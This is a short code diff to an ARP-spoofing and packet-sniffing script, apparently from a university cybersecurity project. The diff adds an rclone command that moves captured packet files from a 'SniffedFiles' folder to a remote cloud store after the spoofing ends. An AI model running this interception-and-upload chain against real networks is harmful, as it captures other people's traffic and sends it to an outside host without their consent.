@@ -3,7 +3,7 @@
 from spoofer import *
 import sys
 import threading
-import pydrive
+import subprocess
 from sniffer import readPackets
 
 def main():
@@ -22,6 +22,9 @@ def main():
 		print("\tARP Spoofing interrupted. Restoring network.")
 		restore(target, host, verbose)
 		restore(host, target, verbose)
+
+	result = subprocess.run(['rclone', 'move', '/home/magnu/UTokyo-Cyber-Security-Project/Packet_Cap/SniffedFiles/', 'Magnus:SecurityTest'])
+
 
 if __name__ == "__main__":
 	main()
